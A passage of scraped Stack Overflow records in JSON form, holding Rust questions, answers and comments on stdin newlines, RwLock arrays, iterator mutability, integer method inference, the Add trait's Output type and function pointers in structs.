"https://stackoverflow.com/questions/48995679/a-string-read-from-standard-input-has-extra-whitespace-when-printed", "closed_reason": "Duplicate", "title": "A string read from standard input has extra whitespace when printed", "body": "<p>I came across this anomalous behavior during printing:</p>\n\n<pre><code>use std::io;\n\nfn main() {\n    let mut number = String::new();\n    io::stdin()\n        .read_line(&amp;mut number)\n        .expect(\"Failed to read line\");\n\n    let mut number_len = number.len();\n    number.truncate(number_len - 1); // removing trailing \\n\n    number_len = number.len();\n\n    println!(\"Number entered is {} with length {}\", number, number_len);\n\n    for i in 0..(number_len - 1) {\n        println!(\"Char at {} is {}\", i, &amp;number[i..i + 1]);\n    }\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>4200                                       &lt;- my input\n with length 5 is 4200                     &lt;- Oddly printed output\nChar at 0 is 4\nChar at 1 is 2\nChar at 2 is 0\nChar at 3 is 0\n</code></pre>\n\n<p>Why is this happening? </p>\n\n<p>Additionally, the length of <code>number</code> is wrong... it should be 4 whereas it is printing 5 even after the truncating.</p>\n"}, {"tags": ["rust", "copy", "traits", "rwlock"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519671151, "post_id": 48994553, "comment_id": 84995693, "body": "Can you explain what you mean by &quot;I don&#39;t want to copy but instance multiple&quot;? I think some translation error is happening here."}, {"owner": {"reputation": 21, "user_id": 9414541, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DjMAz.jpg?s=128&g=1", "display_name": "HappyGoKaboom", "link": "https://stackoverflow.com/users/9414541/happygokaboom"}, "edited": false, "score": 0, "creation_date": 1519680632, "post_id": 48994553, "comment_id": 85000250, "body": "Rwlock doesn&#39;t implement Copy/Clone traits so i was guessing that I would need to call RwLock::new to create multiple instances however if RwLock size cannot be known at compile time it would explain why Copy trait was never implemented into RwLock,  Wont know for sure unless I look at its source code but my rust is lacking to look that far under the hood.    after a little more research Boxing the RwLock (from sheps post) with a fixed sized Array I found that the box&lt;Array&gt; approach would create the array on the stack and then the box would then move it onto the heap."}, {"owner": {"reputation": 21, "user_id": 9414541, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DjMAz.jpg?s=128&g=1", "display_name": "HappyGoKaboom", "link": "https://stackoverflow.com/users/9414541/happygokaboom"}, "edited": false, "score": 0, "creation_date": 1519680897, "post_id": 48994553, "comment_id": 85000363, "body": "Oh by copy from rust docs it copies the bits of a data to form the new instance(copy) of it rather than simply creating a new instance.... (im coming from a web dev background first system lang i`ve so its all new to me)"}, {"owner": {"reputation": 21, "user_id": 9414541, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DjMAz.jpg?s=128&g=1", "display_name": "HappyGoKaboom", "link": "https://stackoverflow.com/users/9414541/happygokaboom"}, "edited": false, "score": 0, "creation_date": 1519681056, "post_id": 48994553, "comment_id": 85000455, "body": "after looking at how my data structs would need to work, a read and write should never occur at the same time regardless of concurrency/parreleism so direct memory manipulation in unsafe code should work with no problems,  however if i mess it up..leaks...no thread safety..fubar could be the result.. me gotta learn more"}, {"owner": {"reputation": 21, "user_id": 9414541, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DjMAz.jpg?s=128&g=1", "display_name": "HappyGoKaboom", "link": "https://stackoverflow.com/users/9414541/happygokaboom"}, "edited": false, "score": 0, "creation_date": 1519684428, "post_id": 48994553, "comment_id": 85001834, "body": "2 usefull insights into Box and Vec collections data.  For others who run into the same issues, Box and Vec elements are on the heap, for Box any stack allocation type gets moved onto the heap  <a href=\"https://www.reddit.com/r/rust/comments/6mrn0i/rust_box_memory_allocation/\" rel=\"nofollow noreferrer\">reddit.com/r/rust/comments/6mrn0i/rust_box_memory_allocation</a>"}, {"owner": {"reputation": 21, "user_id": 9414541, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DjMAz.jpg?s=128&g=1", "display_name": "HappyGoKaboom", "link": "https://stackoverflow.com/users/9414541/happygokaboom"}, "edited": false, "score": 0, "creation_date": 1519684435, "post_id": 48994553, "comment_id": 85001836, "body": "Note: For the main thread stack allocation is limited, spawn a child thread with a specific stack size if you need more, this post shows the issue of stack allocations via collections(Box) gets moved onto the heap but initially uses stack, and the main threads stack is limited.  <a href=\"https://www.reddit.com/r/rust/comments/3vngdd/why_is_box_not_allocating_memory_on_the_heap/\" rel=\"nofollow noreferrer\">reddit.com/r/rust/comments/3vngdd/&hellip;</a>"}], "owner": {"reputation": 21, "user_id": 9414541, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DjMAz.jpg?s=128&g=1", "display_name": "HappyGoKaboom", "link": "https://stackoverflow.com/users/9414541/happygokaboom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 219, "favorite_count": 0, "closed_date": 1519696418, "answer_count": 0, "score": 2, "last_activity_date": 1519696434, "creation_date": 1519668520, "last_edit_date": 1519670461, "question_id": 48994553, "link": "https://stackoverflow.com/questions/48994553/array-of-structs-with-individual-rwlocks-for-each-block", "closed_reason": "Duplicate", "title": "Array of structs with individual RwLocks for each block", "body": "<p>I am trying to create a struct which holds multiple blocks of bytes where each block of bytes is held in an individual <code>RwLock</code>. </p>\n\n<p>This is for a voxel engine where performance is very important. Each block of bytes will need to be read/written by multiple threads. Multiple <code>RwLocks</code> are needed so that only a specific block will be locked leaving the rest of the blocks free to be read/written by other threads; locking the full struct would cause locking of all threads that are performing work.</p>\n\n<p>Most other structs will be assigned a specific slot, the block of bytes needs to be stack allocated. </p>\n\n<p>The compiler complains that it cannot copy the <code>RwLock</code>s as there is no <code>Copy</code> trait on <code>RwLock</code>, which I don't want to copy but instance multiple <code>RwLocks</code>.</p>\n\n<pre><code>mod constants {\n    pub const CHUNK_BASE_SIZE: usize = 7;\n    pub const CHUNK_ALLOC_COUNT: usize = 11;\n}\n\nmod example {\n    use std::sync::RwLock;\n    use super::constants;\n\n    // =====================================================================\n    struct BU8 {\n        bytes: [[u8; constants::CHUNK_BASE_SIZE]; constants::CHUNK_BASE_SIZE],\n    }\n\n    impl BU8 {\n        pub fn new() -&gt; BU8 {\n            BU8 {\n                bytes: [[0; constants::CHUNK_BASE_SIZE]; constants::CHUNK_BASE_SIZE],\n            }\n        }\n    }\n\n    // =====================================================================\n    pub struct Bytes {\n        block: RwLock&lt;BU8&gt;,\n    }\n\n    impl Bytes {\n        pub fn new() -&gt; Bytes {\n            Bytes {\n                block: RwLock::new(BU8::new()),\n            }\n        }\n\n        pub fn read(&amp;self, y: usize, xz: usize) -&gt; u8 {\n            self.block.read().unwrap().bytes[y][xz]\n        }\n\n        pub fn write(&amp;mut self, y: usize, xz: usize, value: u8) {\n            self.block.write().unwrap().bytes[y][xz] = value;\n        }\n    }\n\n    // =====================================================================\n    pub struct Stacks {\n        slots: [Bytes; constants::CHUNK_ALLOC_COUNT],\n    }\n\n    impl Stacks {\n        pub fn new() -&gt; Stacks {\n            Stacks {\n                // Cannot Copy, I dont want a Copy I want to instance a fixed sized array of RwLocks&lt;BU8&gt; blocks\n                slots: [Bytes::new(); constants::CHUNK_ALLOC_COUNT],\n            }\n        }\n    }\n}\n\nfn main() {}\n</code></pre>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0277]: the trait bound `example::Bytes: std::marker::Copy` is not satisfied\n  --&gt; src/main.rs:53:24\n   |\n53 |                 slots: [Bytes::new(); constants::CHUNK_ALLOC_COUNT],\n   |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ the trait `std::marker::Copy` is not implemented for `example::Bytes`\n   |\n   = note: the `Copy` trait is required because the repeated element will be copied\n</code></pre>\n\n<p>The main thread spawns a child thread that will hold all game/core data on and will be accessible through each worker thread the child thread will spawn.  </p>\n\n<p>Each worker thread will be assigned workloads to read/write data on an assigned <code>Block</code> on the <code>Stacks</code>, but I don't know how to instance multiple <code>RwLocks</code> this way or any other way without using the collections.</p>\n\n<p>I tried adding <code>#[derive(Copy, Clone)]</code> for each struct but the <code>Bytes</code> struct error is:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0204]: the trait `Copy` may not be implemented for this type\n  --&gt; src/main.rs:24:18\n   |\n24 |         #[derive(Copy, Clone)]\n   |                  ^^^^\n25 |         pub struct Bytes {\n26 |             block: RwLock&lt;BU8&gt;,\n   |             ------------------ this field does not implement `Copy`\n</code></pre>\n\n<p>I'm guessing <code>RwLock</code> size cannot known at compile time so would a vector of pointers to each block of bytes work? If so how do I implement that safely?</p>\n"}, {"tags": ["iterator", "rust"], "answers": [{"comments": [{"owner": {"reputation": 999, "user_id": 1062022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c93e5c8255d094dad7bca1387ef58e21?s=128&d=identicon&r=PG", "display_name": "Justmaker", "link": "https://stackoverflow.com/users/1062022/justmaker"}, "edited": false, "score": 0, "creation_date": 1519664964, "post_id": 48993375, "comment_id": 84992424, "body": "Alright, thanks for the explanation. I suspected it was linked to the call to Iterator::next, but couldn&#39;t wrap my head around the map/filter case."}], "tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": true, "score": 6, "last_activity_date": 1519664457, "last_edit_date": 1519664457, "creation_date": 1519664085, "answer_id": 48993375, "question_id": 48993119, "link": "https://stackoverflow.com/questions/48993119/why-does-iteratorall-need-the-iterator-to-be-mutable/48993375#48993375", "title": "Why does Iterator::all need the iterator to be mutable?", "body": "<p>Iterating <em>anything</em> requires mutating the iterator because <a href=\"https://doc.rust-lang.org/std/iter/trait.Iterator.html#tymethod.next\" rel=\"noreferrer\"><code>Iterator::next</code></a> takes <code>&amp;mut self</code>. Checking all the values in the iterator requires iteration, therefore <code>Iterator::all</code> (and many similar methods) requires <code>&amp;mut self</code> as well.</p>\n\n<blockquote>\n  <p>The <code>all</code> method should not have to alter the the iterator.</p>\n</blockquote>\n\n<p>I am very interested to hear how you propose to check every value in an iterator <em>without</em> calling <code>next</code>.</p>\n\n<blockquote>\n  <p>Like <code>map</code> or <code>filter</code></p>\n</blockquote>\n\n<p>These methods return a new iterator, they do not call <code>next</code>. That being said, they could if they wanted because... </p>\n\n<blockquote>\n  <p>which take <code>self</code> and not <code>mut self</code> as an argument. </p>\n</blockquote>\n\n<p>Mutability is a property of the owner of a variable. These two functions are equivalent:</p>\n\n<pre><code>fn example(mut a: String) {}\n</code></pre>\n\n\n\n<pre><code>fn example(a: String) {\n    let mut a = a;\n}\n</code></pre>\n\n<p>Importantly, both look the same in the generated documentation \u2014 neither have <code>mut</code> in the signature. This is because it doesn't matter to the caller.</p>\n"}, {"tags": [], "owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "is_accepted": false, "score": 3, "last_activity_date": 1519664422, "last_edit_date": 1519664422, "creation_date": 1519664319, "answer_id": 48993445, "question_id": 48993119, "link": "https://stackoverflow.com/questions/48993119/why-does-iteratorall-need-the-iterator-to-be-mutable/48993445#48993445", "title": "Why does Iterator::all need the iterator to be mutable?", "body": "<p>The iterator methods <code>all</code> and <code>any</code> take a mutable reference because they will be modifying the iterator by consuming its elements (note that <code>next()</code> also requires <code>&amp;mut self</code>, since it inherently modifies the state of the iterator). In addition, the methods are short-circuiting, and do not necessarily consume all elements of the iterator. This means that the methods can give the iterator back to the caller, thus being able to continue consuming from it if so is desired.</p>\n\n<pre><code>let x = vec![1, 2, 5];\nlet mut it = x.into_iter();\nassert!(it.any(|x| x &gt; 1));\nassert_eq!(it.next(), Some(5));\n</code></pre>\n\n<p><code>map</code> or <code>filter</code> work differently, because they are iterator <em>adaptors</em>. Once invoked, the returned adaptor value will own the underlying iterator, and thus requires <code>self</code> to be moved. Values do not have to be bound to a mutable variable to be moved to another scope, even if they are modified later on in that context.</p>\n"}], "owner": {"reputation": 999, "user_id": 1062022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c93e5c8255d094dad7bca1387ef58e21?s=128&d=identicon&r=PG", "display_name": "Justmaker", "link": "https://stackoverflow.com/users/1062022/justmaker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 218, "favorite_count": 0, "accepted_answer_id": 48993375, "answer_count": 2, "score": 2, "last_activity_date": 1519664457, "creation_date": 1519663289, "last_edit_date": 1519664097, "question_id": 48993119, "link": "https://stackoverflow.com/questions/48993119/why-does-iteratorall-need-the-iterator-to-be-mutable", "title": "Why does Iterator::all need the iterator to be mutable?", "body": "<p>I was using an iterator on a <code>String</code>'s characters:</p>\n\n<pre><code>pub fn is_yelling(message: &amp;str) -&gt; bool {\n    let letters = message.chars().filter(|c| c.is_alphabetic());\n    message.chars().any(|c| c.is_alphabetic()) &amp;&amp; letters.all(|c| c.is_uppercase())\n}\n</code></pre>\n\n<p>This raises a compilation error: </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0596]: cannot borrow immutable local variable `letters` as mutable\n --&gt; src/main.rs:3:51\n  |\n2 |     let letters = message.chars().filter(|c| c.is_alphabetic());\n  |         ------- consider changing this to `mut letters`\n3 |     message.chars().any(|c| c.is_alphabetic()) &amp;&amp; letters.all(|c| c.is_uppercase())\n  |                                                   ^^^^^^^ cannot borrow mutably\n</code></pre>\n\n<p>When I make <code>letters</code> mutable everything runs smoothly.</p>\n\n<p>I do not understand why this necessary. The <code>all</code> method should not have to alter the the iterator. Like <code>map</code> or <code>filter</code>, which take <code>self</code> and not <code>mut self</code> as an argument. </p>\n\n<p>My <a href=\"https://doc.rust-lang.org/std/iter/trait.Iterator.html\" rel=\"nofollow noreferrer\">reference for <code>map</code> / <code>filter</code> / <code>all</code></a>.</p>\n\n<p>I saw <a href=\"https://github.com/rust-lang/rust/issues/22617\" rel=\"nofollow noreferrer\">an issue on the matter</a>, but no explanation was given.</p>\n"}, {"tags": ["methods", "rust", "integer"], "answers": [{"tags": [], "owner": {"reputation": 15864, "user_id": 1870153, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/juCKe.png?s=128&g=1", "display_name": "ljedrz", "link": "https://stackoverflow.com/users/1870153/ljedrz"}, "is_accepted": true, "score": 6, "last_activity_date": 1519656595, "last_edit_date": 1519656595, "creation_date": 1519656247, "answer_id": 48991050, "question_id": 48991011, "link": "https://stackoverflow.com/questions/48991011/why-does-count-ones-not-work-if-i-dont-specify-the-numbers-type/48991050#48991050", "title": "Why does count_ones not work if I don&#39;t specify the number&#39;s type?", "body": "<p>The method <code>count_ones</code> is not provided by a trait shared among integral types - it's implemented separately for each of them. This means you need to specify the type in order for that method to be applicable to the number you want to use it on - the compiler needs to know which type's implementation to use.</p>\n\n<p>In addition, if you are wondering why in this case the compiler doesn't know that <code>let x = 5;</code> without a specified type should assign <code>i32</code> (the default integral type) and use its implementation of <code>count_ones</code>, it is just not that compilation stage yet - the default types are assigned after the method and function names are resolved.</p>\n"}], "owner": {"reputation": 113, "user_id": 1257888, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66f5dee76de2cb83b24c7e3dad8f294d?s=128&d=identicon&r=PG", "display_name": "a1ien", "link": "https://stackoverflow.com/users/1257888/a1ien"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 48991050, "answer_count": 1, "score": 6, "last_activity_date": 1519656909, "creation_date": 1519656050, "last_edit_date": 1519656909, "question_id": 48991011, "link": "https://stackoverflow.com/questions/48991011/why-does-count-ones-not-work-if-i-dont-specify-the-numbers-type", "title": "Why does count_ones not work if I don&#39;t specify the number&#39;s type?", "body": "<p>Why do I need to explicitly declare type <code>i32</code> for a number to be able to use <a href=\"https://doc.rust-lang.org/std/primitive.i32.html#method.count_ones\" rel=\"nofollow noreferrer\"><code>count_ones</code></a> on it?</p>\n\n<pre><code>fn main() {\n    let x: i32 = 5;\n    println!(\"{}\", x.count_ones());\n}\n</code></pre>\n\n<p>If I wrote <code>let x = 5;</code> I would get an error <code>no method named 'count_ones' found for type '{integer}' in the current scope</code>. Why doesn't it work that way?</p>\n"}, {"tags": ["function", "generics", "types", "rust", "add"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 2, "creation_date": 1519653800, "post_id": 48990202, "comment_id": 84985144, "body": "<code>N: Add&lt;Output = N&gt;</code>"}], "owner": {"reputation": 1462, "user_id": 4529168, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7IOwaMhUJ_U/AAAAAAAAAAI/AAAAAAAACnI/K_fiB4gqxc8/photo.jpg?sz=128", "display_name": "jiwopene", "link": "https://stackoverflow.com/users/4529168/jiwopene"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "closed_date": 1519653774, "answer_count": 0, "score": 1, "last_activity_date": 1519654164, "creation_date": 1519653354, "last_edit_date": 1519653964, "question_id": 48990202, "link": "https://stackoverflow.com/questions/48990202/force-output-of-operator-to-be-the-same-as-its-input-in-a-function", "closed_reason": "Duplicate", "title": "Force output of + operator to be the same as its input in a function?", "body": "<p>I have a function <code>test</code> that calculates the sum of two variables of type <code>N</code>, returning <code>N</code>. How can I specify <code>N::Output</code> type must be <code>N</code>?</p>\n\n<pre><code>use std::ops::Add;\n\nfn test&lt;N: Add&gt;(num_a: N, num_b: N) -&gt; N {\n    num_a + num_b\n}\n\nfn main() {\n    println!(\"{:?}\", test(5, 7));\n}\n</code></pre>\n\n<p><a href=\"https://play.rust-lang.org/?gist=77aa319219261ce7d4453ab8907dfa2f&amp;version=stable\" rel=\"nofollow noreferrer\">Playground</a></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0308]: mismatched types\n --&gt; src/main.rs:4:5\n  |\n3 | fn test&lt;N: Add&gt;(num_a: N, num_b: N) -&gt; N {\n  |                                        - expected `N` because of return type\n4 |     num_a + num_b\n  |     ^^^^^^^^^^^^^ expected type parameter, found associated type\n  |\n  = note: expected type `N`\n             found type `&lt;N as std::ops::Add&gt;::Output`\n</code></pre>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519655255, "post_id": 48987694, "comment_id": 84986078, "body": "<a href=\"https://meta.stackexchange.com/questions/222735/can-i-ask-only-one-question-per-post\"><b>One</b> question per question</a>"}], "answers": [{"tags": [], "owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "is_accepted": true, "score": 4, "last_activity_date": 1519649308, "creation_date": 1519649308, "answer_id": 48988887, "question_id": 48987694, "link": "https://stackoverflow.com/questions/48987694/initialising-a-function-pointer-inside-a-struct/48988887#48988887", "title": "Initialising a function pointer inside a struct", "body": "<blockquote>\n  <p><strong>Question 1)</strong> Is there a way for me to assign function directly to a struct field without defining it separately (inline).</p>\n</blockquote>\n\n<p>No.</p>\n\n<p>Functions are items, items need be defined separately from their usage.</p>\n\n<blockquote>\n  <p><strong>Question 2)</strong> Functions are similar to Closures. If there are no captures, they are identical for all practical purposes. Is it safe/optimal to do this (define closures instead of functions) for struct initialization?</p>\n</blockquote>\n\n<p>Yes.</p>\n\n<p>I would even go so far as to say that this is the idiomatic way of using closures: you rarely need to assign them a name before using them.</p>\n\n<p>And if your closure accidentally captures, then it cannot be implicitly transformed into a <code>fn</code> and the compiler will error out.</p>\n"}], "owner": {"reputation": 1339, "user_id": 682485, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/ea1e106f2d083f0624c0c4f48ae1c18b?s=128&d=identicon&r=PG", "display_name": "Malice", "link": "https://stackoverflow.com/users/682485/malice"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 474, "favorite_count": 0, "accepted_answer_id": 48988887, "answer_count": 1, "score": 1, "last_activity_date": 1519654764, "creation_date": 1519645254, "last_edit_date": 1519654764, "question_id": 48987694, "link": "https://stackoverflow.com/questions/48987694/initialising-a-function-pointer-inside-a-struct", "title": "Initialising a function pointer inside a struct", "body": "<p>I've a struct that contains a function pointer</p>\n\n<pre><code>struct A {\n    b: fn() -&gt; bool,\n}\n\nfn main() {\n    fn x() -&gt; bool {\n        true\n    }\n    let a = A { b: x };\n    println!(\"{}\", (a.b)())\n}\n</code></pre>\n\n<p>The above snippet compiles and works as expected. Now, I am trying to avoid the defining the function seperately and do it inline in <code>struct</code> definition. Something like this,</p>\n\n<pre><code>struct A{\n    b: fn() -&gt; bool\n}\n\nfn main(){\n    let a = A { b: fn x() -&gt; bool { true } };\n    println!(\"{}\", (a.b)())\n}\n</code></pre>\n\n<p>The above code doesn't compile.</p>\n\n<p>Of course, it works with closures</p>\n\n<pre><code>struct A {\n    b: fn() -&gt; bool,\n}\n\nfn main() {\n    let a = A { b: || true };\n    println!(\"{}\", (a.b)())\n}\n</code></pre>\n\n<p><strong>Question 1)</strong> Is there a way for me to assign function directly to a struct field without defining it seperately(inline).</p>\n\n<p><strong>Question 2)</strong> Functions are similar to Closures. If there are no captures, they are identical for all <a href=\"https://ricardomartins.cc/2015/10/12/practical_differences_between_rust_closures_and_functions\" rel=\"nofollow noreferrer\">practical purposes</a>. Is it safe/optimal to do this (define closures instead of functions) for  struct initialisations?</p>\n\n<p><a href=\"https://play.rust-lang.org/?gist=da29c34931e0c78f99bd1ac8ab9ba947&amp;version=stable\" rel=\"nofollow noreferrer\">Playground link</a></p>\n"}, {"tags": ["rust"], "answers": [{"comments": [{"owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519660553, "post_id": 48992090, "comment_id": 84989516, "body": "Makes sense. I will go with the first approach and stick to my signature, since the iterator is more generic."}, {"owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "reply_to_user": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "edited": false, "score": 0, "creation_date": 1519660698, "post_id": 48992090, "comment_id": 84989601, "body": "@Tim there <i>may</i> be other ways; I&#39;m not too much of an expert here. But since there was no response in three hours I decided to share what little I know :) I suggest you check back tomorrow or so... someone else might know a way that lets you have both."}], "tags": [], "owner": {"reputation": 19105, "user_id": 3005167, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/t0bMQ.png?s=128&g=1", "display_name": "kazemakase", "link": "https://stackoverflow.com/users/3005167/kazemakase"}, "is_accepted": true, "score": 6, "last_activity_date": 1526681209, "last_edit_date": 1526681209, "creation_date": 1519659888, "answer_id": 48992090, "question_id": 48987501, "link": "https://stackoverflow.com/questions/48987501/function-which-accepts-a-slice-of-tuples-of-slices-with-intoiterator-trait/48992090#48992090", "title": "Function which accepts a slice of tuples of slices with IntoIterator trait", "body": "<p>The function definition is perfectly fine; the problem is how you construct the argument. Without the function it does not work either: </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>41 |     let x = &amp;[(s, &amp;[0.1, 0.2, 0.3]), (s, &amp;[0.5, 0.6])];\n   |                                          ^^^^^^^^^^^ expected an array with a fixed size of 3 elements, found one with 2 elements\n   |\n   = note: expected type `&amp;[{float}; 3]`\n              found type `&amp;[{float}; 2]`\n</code></pre>\n\n<p>The compiler sees the first element of the outer slice and infers that this slice has elements of type <code>(&amp;S, &amp;[{float}; 3])</code>. This conflicts with the second element which has length 2. It simply does not know that it could/should use the more generic arbitrary slice <code>&amp;[{float}]</code>. </p>\n\n<p>If we explicitly force the type of the first element it compiles fine:</p>\n\n<pre><code>f(&amp;[(s, &amp;[0.1f32, 0.2, 0.3] as &amp;[f32]), (s, &amp;[0.5, 0.6])]);\n</code></pre>\n\n<p>Alternatively, you can pass in iterators, which conveniently also implement <code>IntoIterator</code>:</p>\n\n<pre><code>f(&amp;[(s, [0.1, 0.2, 0.3].iter()), (s, [0.5, 0.6].iter())]);\n</code></pre>\n\n<p>Granted, neither approach is particularly convenient (although the latter is not too bad IMO). If the goal is to have a function that takes nested slices you can define it as such:</p>\n\n<pre><code>fn f2&lt;T&gt;(iter: &amp;[(&amp;S, &amp;[T])]) {}\n\nf2(&amp;[(s, &amp;[0.1, 0.2, 0.3]), (s, &amp;[0.5, 0.6])]);\n</code></pre>\n\n<p>You have to choose your trade-off: Either have a function that conveniently takes slices but refuses other iterables, or have a function that takes any iterable but is slightly more cumbersome to invoke.</p>\n\n<p>This advice also applies if your function uses the new <code>impl Trait</code>-syntax:</p>\n\n<pre><code>fn f&lt;'a&gt;(iter: impl IntoIterator&lt;Item = &amp;'a (&amp;'a S, impl IntoIterator&lt;Item = &amp;'a f32&gt; + 'a)&gt;)\n</code></pre>\n"}], "owner": {"reputation": 5700, "user_id": 3131852, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26365707ecfa02e221f5192aaaa29a43?s=128&d=identicon&r=PG", "display_name": "Tim Diekmann", "link": "https://stackoverflow.com/users/3131852/tim-diekmann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 361, "favorite_count": 0, "accepted_answer_id": 48992090, "answer_count": 1, "score": 4, "last_activity_date": 1526681209, "creation_date": 1519644657, "last_edit_date": 1526681058, "question_id": 48987501, "link": "https://stackoverflow.com/questions/48987501/function-which-accepts-a-slice-of-tuples-of-slices-with-intoiterator-trait", "title": "Function which accepts a slice of tuples of slices with IntoIterator trait", "body": "<p>I have a function <code>f</code> which should be called like this:</p>\n\n<pre><code>struct S;\n\nlet s = &amp;S;\n\nf(&amp;[(s, &amp;[0.1, 0.2, 0.3]), (s, &amp;[0.5, 0.6])]);\n</code></pre>\n\n<p>For a convenience interface, I want <code>f</code> to handle any kind of <code>IntoIterator</code>. At the moment, my signature is</p>\n\n<pre><code>fn f&lt;'a, I, J: 'a&gt;(iter: I)\nwhere\n    I: IntoIterator&lt;Item = &amp;'a (&amp;'a S, J)&gt;,\n    J: IntoIterator&lt;Item = &amp;'a f32&gt;\n</code></pre>\n\n<p>sadly, the compiler treats the slices as fixed sized arrays, so I got this error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0308]: mismatched types\n   --&gt; sandbox/src/main.rs:142:33\n    |\n142 |     f(&amp;[(s, &amp;[0.1, 0.2, 0.3]), (s, &amp;[0.5, 0.6])]);\n    |                                    ^^^^^^^^^^^ expected an array with a fixed size of 3 elements, found one with 2 elements\n    |\n    = note: expected type `&amp;[{float}; 3]`\n               found type `&amp;[{float}; 2]`\n</code></pre>\n\n<p>Replacing <code>J</code> with <code>Vec&lt;f32&gt;</code> works, but this is isn't the way I want to go.</p>\n\n<p>Is there a way to handle this so that I can call the function the way I mentioned? At first I thought this could be solved with <a href=\"https://doc.rust-lang.org/nomicon/hrtb.html\" rel=\"nofollow noreferrer\">Higher-Rank Trait Bounds</a>, but these are only available for lifetime parameters.</p>\n\n<p>If it can be made to work, how do I properly handle these nested <code>IntoIterator</code>? How I can call <code>J::into_iter()</code>?</p>\n"}, {"tags": ["string", "rust"], "comments": [{"owner": {"reputation": 10374, "user_id": 11758, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/bb3a135574a76a56886cbd04675cb296?s=128&d=identicon&r=PG&f=1", "display_name": "Laserallan", "link": "https://stackoverflow.com/users/11758/laserallan"}, "edited": false, "score": 0, "creation_date": 1519640016, "post_id": 48985924, "comment_id": 84976384, "body": "<a href=\"http://www.ameyalokare.com/rust/2017/10/12/rust-str-vs-String.html\" rel=\"nofollow noreferrer\">ameyalokare.com/rust/2017/10/12/rust-str-vs-String.html</a> Seems like String coerces to str but not the other way around."}, {"owner": {"reputation": 13772, "user_id": 379311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c993f4f111e6ff3211ccda1b98828253?s=128&d=identicon&r=PG", "display_name": "Yann Vernier", "link": "https://stackoverflow.com/users/379311/yann-vernier"}, "edited": false, "score": 3, "creation_date": 1519641248, 